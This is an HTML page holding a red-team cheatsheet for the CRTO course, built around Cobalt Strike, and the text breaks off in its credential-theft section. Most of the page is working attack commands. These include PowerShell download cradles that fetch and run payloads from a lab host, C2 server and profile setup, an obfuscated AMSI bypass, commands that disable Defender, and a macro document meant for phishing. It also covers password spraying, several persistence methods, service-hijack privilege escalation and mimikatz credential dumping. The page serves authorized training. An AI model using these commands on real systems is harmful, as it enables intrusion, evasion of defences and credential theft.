@@ -1,0 +1,1687 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Mani Bharathi</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="img/favicon.png" rel="icon">
+  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="vendor/aos/aos.css" rel="stylesheet">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="css/style.css" rel="stylesheet">
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+ <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+      
+        <h1 class="text-light"><a href="index-2.html">
+
+          <br>ЖĆØĐ€</a>
+        </a></h1>
+        <div class="social-links mt-3 text-center">
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="index-2.html"   class="nav-link scrollto active"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="resume.html"  class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i>Resume</a></li>
+          <li><a href="portfolio.html" class="nav-link scrollto"><i class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
+          <li><a href="cheatsheets.html" class="nav-link scrollto"><i class="bi bi-shield-check"></i>Cheatsheets</a></li>
+          <li><a href="Resourses.html" class="nav-link scrollto"><i class="bi bi-router"></i>Start Resources</a></li>
+          <li><a href="https://buymeacoffee.com/xcode96" target="_blank" class="nav-link scrollto"><i class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li> 
+
+  
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>CRTO+ Cheatsheet</h2>
+          <ol>
+            <li><a href="index-2.html">Home</a></li>
+            <li>Certified Read Team Operator CRTO Cheatsheet</li>
+          </ol>  
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <!-- ======= Disclaimer Alert ======= -->
+            <div class="alert alert-danger alert-dismissible fade show" role="alert" data-aos="fade-right">
+              <strong>Disclaimer:</strong> This cheatsheet is provided for educational and authorized security testing
+              purposes only. All techniques, tools, and methods described herein must be used only in environments
+              <strong>you have explicit permission to perform security assessments</strong>. The author(s) of this
+              cheatsheet are not responsible for any misuse or damage resulting from the application of this material.
+              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            <div class="cheatsheet-content">
+<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="Certified_Read_Team_Operator_CRTO__Cheatsheet_0"></a>Certified Read Team Operator (CRTO) - Cheatsheet</h1>
+<p class="has-line-data" data-line-start="2" data-line-end="3"><strong>Name</strong> : <strong>CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)</strong></p>
+<p class="has-line-data" data-line-start="4" data-line-end="5"><strong>Course Link</strong> : <a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></p>
+<p class="has-line-data" data-line-start="6" data-line-end="7"><strong>Disclaimer</strong> : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.</p>
+<h3 class="code-line" data-line-start=8 data-line-end=9 ><a id="MISC_8"></a>MISC</h3>
+<pre><code class="has-line-data" data-line-start="11" data-line-end="34" class="language-powershell"><span class="hljs-comment"># Run a python3 webserver</span>
+$ python3 -m http.server
+
+<span class="hljs-comment"># Check outbound access to TeamServer</span>
+$ iwr -Uri http://nickelviper.com/a
+
+<span class="hljs-comment"># Change incoming firewall rules</span>
+beacon&gt; powerpick New-NetFirewallRule -DisplayName <span class="hljs-string">"Test Rule"</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <span class="hljs-number">8080</span>
+beacon&gt; powerpick Remove-NetFirewallRule -DisplayName <span class="hljs-string">"Test Rule"</span>
+
+<span class="hljs-comment">## Encode the powershell payload for handling extra quotes </span>
+
+<span class="hljs-comment"># Powershell</span>
+PS C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'</span>
+PS C:\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))
+
+<span class="hljs-comment">#Linux </span>
+$ echo -n <span class="hljs-string">"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')"</span> | iconv -t UTF-<span class="hljs-number">16</span>LE | base64 -w <span class="hljs-number">0</span>
+
+<span class="hljs-comment"># Final Command</span>
+powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;
+
+</code></pre>
+<h3 class="code-line" data-line-start=36 data-line-end=37 ><a id="Command__Control_36"></a>Command &amp; Control</h3>
+<ul>
+<li class="has-line-data" data-line-start="38" data-line-end="40">Setting up DNS records for DNS based beacon payloads</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="41" data-line-end="53" class="language-powershell"><span class="hljs-comment"># Set below DNS Type A &amp; NS records, where IP points to TeamServer</span>
+
+@    | A  | <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span>
+ns1  | A  | <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span>
+pics | NS | ns1.nickelviper.com
+
+<span class="hljs-comment"># Verify the DNS configuration from TeamServer, it should return 0.0.0.0</span>
+$ dig @ns1.nickelviper.com test.pics.nickelviper.com +short
+
+<span class="hljs-comment"># Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration</span>
+
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="54" data-line-end="56">Start the team server and run as service</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="57" data-line-end="59" class="language-powershell">&gt; sudo ./teamserver <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span> Passw0rd! c2-profiles/normal/webbug.profile
+</code></pre>
+<pre><code class="has-line-data" data-line-start="61" data-line-end="84" class="language-powershell">$ sudo vim /etc/systemd/system/teamserver.service
+
+[Unit]
+Description=Cobalt Strike Team Server
+After=network.target
+StartLimitIntervalSec=<span class="hljs-number">0</span>
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=<span class="hljs-number">1</span>
+User=root
+WorkingDirectory=/home/attacker/cobaltstrike
+ExecStart=/home/attacker/cobaltstrike/teamserver <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span> Passw0rd! c2-profiles/normal/webbug.profile
+
+[Install]
+WantedBy=multi-user.target
+
+$ sudo systemctl daemon-reload
+$ sudo systemctl status teamserver.service
+$ sudo systemctl start teamserver.service
+$ sudo systemctl enable teamserver.service
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="85" data-line-end="87">Enable Hosting of Web Delivery Payloads via agscript client in headless mode</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="88" data-line-end="105" class="language-powershell">$ cat host_payloads.cna
+
+<span class="hljs-comment"># Connected and ready</span>
+on ready {
+
+    <span class="hljs-comment"># Generate payload</span>
+    <span class="hljs-variable">$payload</span> = artifact_payload(<span class="hljs-string">"http"</span>, <span class="hljs-string">"powershell"</span>, <span class="hljs-string">"x64"</span>);
+
+    <span class="hljs-comment"># Host payload</span>
+    site_host(<span class="hljs-string">"10.10.5.50"</span>, <span class="hljs-number">80</span>, <span class="hljs-string">"/a"</span>, <span class="hljs-variable">$payload</span>, <span class="hljs-string">"text/plain"</span>, <span class="hljs-string">"Auto Web Delivery (PowerShell)"</span>, false);
+}
+
+<span class="hljs-comment"># Add below command in "/etc/systemd/system/teamserver.service" file</span>
+
+ExecStartPost=/bin/sh -c <span class="hljs-string">'/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &amp;'</span>
+
+</code></pre>
+<pre><code class="has-line-data" data-line-start="107" data-line-end="200" class="language-powershell"><span class="hljs-comment"># Custom C2 Profile for CRTO</span>
+set sample_name <span class="hljs-string">"Dumbledore"</span>;
+set sleeptime <span class="hljs-string">"5000"</span>;
+set jitter    <span class="hljs-string">"20"</span>;
+set useragent <span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"</span>;
+set host_stage <span class="hljs-string">"true"</span>;
+
+post-ex {
+        set amsi_disable <span class="hljs-string">"true"</span>;
+    set spawnto_x86 <span class="hljs-string">"%windir%\\syswow64\\dllhost.exe"</span>;
+    set spawnto_x64 <span class="hljs-string">"%windir%\\sysnative\\dllhost.exe"</span>;
+}
+
+http-get {
+    set uri <span class="hljs-string">"/cat.gif /image /pixel.gif /logo.gif"</span>;
+
+    client {
+            <span class="hljs-comment"># customize client indicatorsi</span>
+        header <span class="hljs-string">"Accept"</span> <span class="hljs-string">"text/html,image/avif,image/webp,*/*"</span>;
+        header <span class="hljs-string">"Accept-Language"</span> <span class="hljs-string">"en-US,en;q=0.5"</span>;
+        header <span class="hljs-string">"Accept-Encoding"</span> <span class="hljs-string">"gzip, deflate"</span>;
+        header <span class="hljs-string">"Referer"</span> <span class="hljs-string">"https://www.google.com"</span>;
+
+        parameter <span class="hljs-string">"utm"</span> <span class="hljs-string">"ISO-8898-1"</span>;
+        parameter <span class="hljs-string">"utc"</span> <span class="hljs-string">"en-US"</span>;
+
+        metadata{
+            base64;
+            header <span class="hljs-string">"Cookie"</span>;
+        }
+    }
+
+    server {
+        <span class="hljs-comment"># customize soerver indicators</span>
+        header <span class="hljs-string">"Content-Type"</span> <span class="hljs-string">"image/gif"</span>;
+        header <span class="hljs-string">"Server"</span> <span class="hljs-string">"Microsoft IIS/10.0"</span>;   
+        header <span class="hljs-string">"X-Powered-By"</span> <span class="hljs-string">"ASP.NET"</span>;    
+
+
+
+        output{
+            prepend <span class="hljs-string">"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"</span>;
+                        prepend <span class="hljs-string">"\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"</span>;
+                        prepend <span class="hljs-string">"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"</span>;
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri <span class="hljs-string">"/submit.aspx /finish.aspx"</span>;
+
+    client {
+
+        header <span class="hljs-string">"Content-Type"</span> <span class="hljs-string">"application/octet-stream"</span>;
+        header <span class="hljs-string">"Accept"</span> <span class="hljs-string">"text/html,image/avif,image/webp,*/*"</span>;
+        header <span class="hljs-string">"Accept-Language"</span> <span class="hljs-string">"en-US,en;q=0.5"</span>;
+        header <span class="hljs-string">"Accept-Encoding"</span> <span class="hljs-string">"gzip, deflate"</span>;
+        header <span class="hljs-string">"Referer"</span> <span class="hljs-string">"https://www.google.com"</span>;
+        
+        id{
+            parameter <span class="hljs-string">"id"</span>;
+        }
+
+        output{
+            print;
+        }
+
+    }
+
+
+    server {
+        <span class="hljs-comment"># customize soerver indicators</span>
+        header <span class="hljs-string">"Content-Type"</span> <span class="hljs-string">"text/plain"</span>;
+        header <span class="hljs-string">"Server"</span> <span class="hljs-string">"Microsoft IIS/10.0"</span>;   
+        header <span class="hljs-string">"X-Powered-By"</span> <span class="hljs-string">"ASP.NET"</span>;    
+
+        output{
+            print;
+        }
+    }
+}
+
+http-stager {
+
+    server {
+        header <span class="hljs-string">"Content-Type"</span> <span class="hljs-string">"application/octet-stream"</span>;
+        header <span class="hljs-string">"Server"</span> <span class="hljs-string">"Microsoft IIS/10.0"</span>;   
+        header <span class="hljs-string">"X-Powered-By"</span> <span class="hljs-string">"ASP.NET"</span>;    
+    }
+}
+
+</code></pre>
+<h3 class="code-line" data-line-start=201 data-line-end=202 ><a id="Defender_Antivirus_201"></a>Defender Antivirus</h3>
+<pre><code class="has-line-data" data-line-start="204" data-line-end="253" class="language-powershell">
+<span class="hljs-comment"># Compile the Artifact kit</span>
+$ ./build.sh pipe VirtualAlloc <span class="hljs-number">277492</span> <span class="hljs-number">5</span> false false /mnt/c/Tools/cobaltstrike/artifacts
+
+<span class="hljs-comment"># Compile the resource kit</span>
+$ ./build.sh /mnt/c/Tools/cobaltstrike/resources
+
+<span class="hljs-comment"># Verify if the payload is AV Safe</span>
+PS&gt; C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
+PS&gt; C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI
+
+<span class="hljs-comment"># Load the CNA file: Cobalt Strike &gt; Script Manager &gt; Load_ and select the CNA</span>
+<span class="hljs-comment"># Use Payloads &gt; Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`</span>
+
+<span class="hljs-comment"># Disable AMSI in Malleable C2 profile</span>
+$ vim c2-profiles/normal/webbug.profile
+
+<span class="hljs-comment">#Right above the `http-get` block, add the following:</span>
+post-ex {
+        set amsi_disable <span class="hljs-string">"true"</span>;
+}
+
+<span class="hljs-comment"># Verify the modified C2 profile</span>
+attacker@ubuntu ~/cobaltstrike&gt; ./c2lint c2-profiles/normal/webbug.profile
+
+<span class="hljs-comment"># Creating custom C2 profiles</span>
+https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/
+
+<span class="hljs-comment"># <span class="hljs-doctag">Note:</span> `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.</span>
+
+<span class="hljs-comment"># Behaviour Detections (change default process for fork &amp; run)</span>
+beacon&gt; spawnto x64 %windir%\sysnative\dllhost.exe
+beacon&gt; spawnto x86 %windir%\syswow64\dllhost.exe
+
+<span class="hljs-comment"># Change the default process for psexec</span>
+beacon&gt; ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+beacon&gt; ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
+
+<span class="hljs-comment"># Disable Defender from local powershell session</span>
+Get-MPPreference
+Set-MPPreference -DisableRealTimeMonitoring <span class="hljs-variable">$true</span>
+Set-MPPreference -DisableIOAVProtection <span class="hljs-variable">$true</span>
+Set-MPPreference -DisableIntrusionPreventionSystem <span class="hljs-variable">$true</span>
+
+<span class="hljs-comment"># AMSI bypass</span>
+S`eT-It`em ( <span class="hljs-string">'V'</span>+<span class="hljs-string">'aR'</span> +  <span class="hljs-string">'IA'</span> + (<span class="hljs-string">'blE:1'</span>+<span class="hljs-string">'q2'</span>)  + (<span class="hljs-string">'uZ'</span>+<span class="hljs-string">'x'</span>)  ) ( [TYpE](  <span class="hljs-string">"{1}{0}"</span>-F<span class="hljs-string">'F'</span>,<span class="hljs-string">'rE'</span>  ) )  ;    (    Get-varI`A`BLE  ( (<span class="hljs-string">'1Q'</span>+<span class="hljs-string">'2U'</span>)  +<span class="hljs-string">'zX'</span>  )  -VaL  ).<span class="hljs-string">"A`ss`Embly"</span>.<span class="hljs-string">"GET`TY`Pe"</span>((  <span class="hljs-string">"{6}{3}{1}{4}{2}{0}{5}"</span> -f(<span class="hljs-string">'Uti'</span>+<span class="hljs-string">'l'</span>),<span class="hljs-string">'A'</span>,(<span class="hljs-string">'Am'</span>+<span class="hljs-string">'si'</span>),(<span class="hljs-string">'.Man'</span>+<span class="hljs-string">'age'</span>+<span class="hljs-string">'men'</span>+<span class="hljs-string">'t.'</span>),(<span class="hljs-string">'u'</span>+<span class="hljs-string">'to'</span>+<span class="hljs-string">'mation.'</span>),<span class="hljs-string">'s'</span>,(<span class="hljs-string">'Syst'</span>+<span class="hljs-string">'em'</span>)  ) ).<span class="hljs-string">"g`etf`iElD"</span>(  ( <span class="hljs-string">"{0}{2}{1}"</span> -f(<span class="hljs-string">'a'</span>+<span class="hljs-string">'msi'</span>),<span class="hljs-string">'d'</span>,(<span class="hljs-string">'I'</span>+<span class="hljs-string">'nitF'</span>+<span class="hljs-string">'aile'</span>)  ),(  <span class="hljs-string">"{2}{4}{0}{1}{3}"</span> -f (<span class="hljs-string">'S'</span>+<span class="hljs-string">'tat'</span>),<span class="hljs-string">'i'</span>,(<span class="hljs-string">'Non'</span>+<span class="hljs-string">'Publ'</span>+<span class="hljs-string">'i'</span>),<span class="hljs-string">'c'</span>,<span class="hljs-string">'c,'</span>  )).<span class="hljs-string">"sE`T`VaLUE"</span>(  ${n`ULl},${t`RuE} )
+
+
+</code></pre>
+<h3 class="code-line" data-line-start=257 data-line-end=258 ><a id="Initial_Compromise_257"></a>Initial Compromise</h3>
+<ul>
+<li class="has-line-data" data-line-start="259" data-line-end="261">Enumerating OWA to identify valid user and conducting password spraying attack</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="262" data-line-end="282" class="language-powershell"><span class="hljs-comment"># Identify the mail server of given domain</span>
+$ dig cyberbotic.io
+$ ./dnscan.py -d cyberbotic.io -w subdomains-<span class="hljs-number">100</span>.txt
+
+<span class="hljs-comment"># Idenitfy the NETBIOS name of target domain</span>
+ps&gt; ipmo C:\Tools\MailSniper\MailSniper.ps1
+ps&gt; Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
+
+<span class="hljs-comment"># Extract Employee Names (FirstName LastName) and Prepare Username List</span>
+$ ~/namemash.py names.txt &gt; possible.txt
+
+<span class="hljs-comment"># Validate the username to find active/real usernames</span>
+ps&gt; Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
+
+<span class="hljs-comment"># Conduct Password Spraying attack with known Password on identified users</span>
+ps&gt; Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
+
+<span class="hljs-comment"># Use Identified credentials to download Global Address List</span>
+ps&gt; Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="283" data-line-end="285">Create a malicious Office file having embedded macro</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="286" data-line-end="311" class="language-vbscript"># <span class="hljs-keyword">Step</span> <span class="hljs-number">1</span>: Open a blank word document <span class="hljs-string">"Document1"</span>. Navigate <span class="hljs-keyword">to</span>  View &gt; Macros &gt; Create. Changes macros <span class="hljs-keyword">in</span> <span class="hljs-keyword">to</span> Document1. Name the <span class="hljs-keyword">default</span> macro <span class="hljs-keyword">function</span> as AutoOpen. Paste the below content <span class="hljs-keyword">and</span> run <span class="hljs-keyword">for</span> testing
+
+<span class="hljs-keyword">Sub</span> AutoOpen()
+
+  <span class="hljs-keyword">Dim</span> Shell As Object
+  <span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">"wscript.shell"</span>)
+  Shell.Run <span class="hljs-string">"notepad"</span>
+
+<span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span>
+
+
+# <span class="hljs-keyword">Step</span> <span class="hljs-number">2</span>: Generate a payload <span class="hljs-keyword">for</span> web delivery (Attacks &gt; Scripted Web Delivery (S) <span class="hljs-keyword">and</span> generate a <span class="hljs-number">64</span>-bit PowerShell payload <span class="hljs-keyword">with</span> your HTTP/DNS listener). Balance the number of quotes
+
+
+<span class="hljs-keyword">Sub</span> AutoOpen()
+
+  <span class="hljs-keyword">Dim</span> Shell As Object
+  <span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">"wscript.shell"</span>)
+    Shell.Run <span class="hljs-string">"powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""</span>
+
+<span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span>
+
+# <span class="hljs-keyword">Step</span> <span class="hljs-number">3</span>: Save the document as .doc file <span class="hljs-keyword">and</span> send it as phising email
+
+</code></pre>
+<h3 class="code-line" data-line-start=313 data-line-end=314 ><a id="Host_Reconnaissance_313"></a>Host Reconnaissance</h3>
+<pre><code class="has-line-data" data-line-start="316" data-line-end="331" class="language-powershell"><span class="hljs-comment"># Identify running process like AV, EDR or any monitoring and logging solution</span>
+beacon&gt; ps
+
+<span class="hljs-comment"># Use Seatbealt to enumerate about system</span>
+beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
+
+<span class="hljs-comment"># Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user</span>
+beacon&gt; screenshot
+beacon&gt; clipboard
+beacon&gt; net logons
+
+beacon&gt; keylogger
+beacon&gt; job
+beacon&gt; jobkill <span class="hljs-number">3</span>
+</code></pre>
+<h3 class="code-line" data-line-start=333 data-line-end=334 ><a id="Host_Persistence_Normal__Privilleged_333"></a>Host Persistence (Normal + Privilleged)</h3>
+<pre><code class="has-line-data" data-line-start="336" data-line-end="384" class="language-powershell">
+<span class="hljs-comment"># Default location for powershell</span>
+C:\windows\syswow64\windowspowershell\v1.<span class="hljs-number">0</span>\powershell
+C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell
+
+<span class="hljs-comment"># Encode the payload for handling extra quotes </span>
+
+<span class="hljs-comment"># Powershell</span>
+PS C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'</span>
+PS C:\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))
+
+<span class="hljs-comment">#Linux </span>
+$ echo -n <span class="hljs-string">"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')"</span> | iconv -t UTF-<span class="hljs-number">16</span>LE | base64 -w <span class="hljs-number">0</span>
+
+<span class="hljs-comment"># Final Command</span>
+powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;
+
+<span class="hljs-comment"># Common userland persistence methods include HKCU / HKLM Registry Autoruns, Scheduled Tasks, Startup Folder</span>
+
+<span class="hljs-comment"># Persistance - Task Scheduler</span>
+beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c <span class="hljs-string">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> -a <span class="hljs-string">"-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA"</span> -n <span class="hljs-string">"Updater"</span> -m add -o hourly
+
+<span class="hljs-comment"># Persistance - Startup Folder</span>
+beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c <span class="hljs-string">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> -a <span class="hljs-string">"-nop -w hidden -enc SQBFAFgAIAAo..vAGEAIgApACkA"</span> -f <span class="hljs-string">"UserEnvSetup"</span> -m add
+
+<span class="hljs-comment"># Persistance - Registry Autorun</span>
+beacon&gt; cd C:\ProgramData
+beacon&gt; upload C:\Payloads\http_x64.exe
+beacon&gt; mv http_x64.exe updater.exe
+beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c <span class="hljs-string">"C:\ProgramData\Updater.exe"</span> -a <span class="hljs-string">"/q /n"</span> -k <span class="hljs-string">"hkcurun"</span> -v <span class="hljs-string">"Updater"</span> -m add
+
+<span class="hljs-comment"># Persistance COM Hijacks</span>
+
+<span class="hljs-comment"># Persistance - Privilleged System User</span>
+
+<span class="hljs-comment"># Windows Service</span>
+beacon&gt; cd C:\Windows
+beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
+beacon&gt; mv tcp-local_x64.svc.exe legit-svc.exe
+beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c <span class="hljs-string">"C:\Windows\legit-svc.exe"</span> -n <span class="hljs-string">"legit-svc"</span> -m add
+
+<span class="hljs-comment"># Register WMI event to trigger our payload</span>
+beacon&gt; cd C:\Windows
+beacon&gt; upload C:\Payloads\dns_x64.exe
+beacon&gt; powershell-import C:\Tools\PowerLurk.ps1
+beacon&gt; powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand <span class="hljs-string">"C:\Windows\dns_x64.exe"</span> -Trigger ProcessStart -ProcessName notepad.exe
+
+</code></pre>
+<h3 class="code-line" data-line-start=386 data-line-end=387 ><a id="Privilege_Escalation_386"></a>Privilege Escalation</h3>
+<pre><code class="has-line-data" data-line-start="389" data-line-end="440" class="language-powershell"><span class="hljs-comment"># Query and Manage all the installed services</span>
+beacon&gt; powershell <span class="hljs-built_in">Get-Service</span> | fl
+beacon&gt; run wmic service get name, pathname
+beacon&gt; run sc query
+beacon&gt; run sc qc VulnService2
+beacon&gt; run sc stop VulnService1
+beacon&gt; run sc start VulnService1
+
+<span class="hljs-comment"># Use SharpUp to find exploitable services</span>
+beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 
+
+<span class="hljs-comment"># CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)</span>
+beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
+beacon&gt; powershell <span class="hljs-built_in">Get-Acl</span> -Path <span class="hljs-string">"C:\Program Files\Vulnerable Services"</span> | fl
+beacon&gt; cd C:\Program Files\Vulnerable Services
+beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
+beacon&gt; mv tcp-local_x64.svc.exe Service.exe
+beacon&gt; run sc stop VulnService1
+beacon&gt; run sc start VulnService1
+beacon&gt; connect localhost <span class="hljs-number">4444</span>
+
+<span class="hljs-comment"># CASE 2: Weak Service Permission (Possible to modify service configuration)</span>
+beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
+beacon&gt; powershell-import C:\Tools\Get-ServiceAcl.ps1
+beacon&gt; powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
+beacon&gt; run sc qc VulnService2
+beacon&gt; mkdir C:\Temp
+beacon&gt; cd C:\Temp
+beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
+beacon&gt; run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
+beacon&gt; run sc qc VulnService2
+beacon&gt; run sc stop VulnService2
+beacon&gt; run sc start VulnService2
+beacon&gt; connect localhost <span class="hljs-number">4444</span>
+
+<span class="hljs-comment"># CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)</span>
+beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
+beacon&gt; powershell <span class="hljs-built_in">Get-Acl</span> -Path <span class="hljs-string">"C:\Program Files\Vulnerable Services\Service 3.exe"</span> | fl
+PS C:\Payloads&gt; copy <span class="hljs-string">"tcp-local_x64.svc.exe"</span> <span class="hljs-string">"Service 3.exe"</span>
+beacon&gt; run sc stop VulnService3
+beacon&gt; cd <span class="hljs-string">"C:\Program Files\Vulnerable Services"</span>
+beacon&gt; upload C:\Payloads\Service <span class="hljs-number">3</span>.exe
+beacon&gt; run sc start VulnService3
+beacon&gt; connect localhost <span class="hljs-number">4444</span>
+
+<span class="hljs-comment"># UAC Bypass</span>
+beacon&gt; run whoami /groups
+beacon&gt; elevate uac-schtasks tcp-local
+beacon&gt; run netstat -anop tcp
+beacon&gt; connect localhost <span class="hljs-number">4444</span>
+</code></pre>
+<h3 class="code-line" data-line-start=442 data-line-end=443 ><a id="Credential_Theft_442"></a>Credential Theft</h3>
+<pre><code class="has-line-data" data-line-start="445" data-line-end="473" class="language-powershell"><span class="hljs-comment"># "!" symbol is used to run command in elevated context of System User</span>
+<span class="hljs-comment"># "@" symbol is used to impersonate beacon thread token</span>
+
+<span class="hljs-comment"># Dump the local SAM database </span>
+beacon&gt; mimikatz !lsadump::sam
+
+<span class="hljs-comment"># Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users</span>
+beacon&gt; mimikatz !sekurlsa::logonpasswords
+
+<span class="hljs-comment"># Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)</span>
+beacon&gt; mimikatz !sekurlsa::ekeys
+
+<span class="hljs-comment"># Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked)</span>
+beacon&gt; mimikatz !lsadump::cache
+
+<span class="hljs-comment"># List the kerberos tickets cached in current logon session or all logon session (privileged session)</span>
